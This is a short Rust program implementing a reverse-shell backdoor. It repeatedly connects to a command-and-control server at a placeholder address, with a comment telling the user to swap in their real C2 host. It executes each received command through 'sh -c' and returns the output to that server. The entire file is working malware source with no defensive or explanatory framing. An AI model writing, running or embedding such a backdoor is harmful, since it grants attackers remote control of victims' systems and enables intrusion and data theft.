use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

const C2_SERVER: &str = "127.0.0.1:4444"; // Change to your actual C2 server

fn execute_command(command: &str) -> String {
    let output = Command::new("sh")
        .arg("-c")
        .arg(command)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("STDOUT:\n{}\nSTDERR:\n{}", stdout, stderr)
        }
        Err(e) => format!("Error executing command: {}", e),
    }
}

fn main() {
    loop {
        match TcpStream::connect(C2_SERVER) {
            Ok(mut stream) => {
                println!("Connected to C2 server at {}", C2_SERVER);
                
                loop {
                    let mut buffer = [0; 1024];
                    match stream.read(&mut buffer) {
                        Ok(0) => {
                            println!("Connection closed by C2 server");
                            break;
                        }
                        Ok(n) => {
                            let command = String::from_utf8_lossy(&buffer[..n]).trim().to_string();
                            if command.to_lowercase() == "exit" {
                                println!("Received exit command. Shutting down.");
                                return;
                            }
                            let result = execute_command(&command);
                            let _ = stream.write_all(result.as_bytes());
                        }
                        Err(_) => {
                            println!("Error reading from C2 server");
                            break;
                        }
                    }
                }
            }
            Err(_) => {
                println!("Failed to connect to C2 server. Retrying in 5 seconds...");
                thread::sleep(Duration::from_secs(5));
            }
        }
    }
}
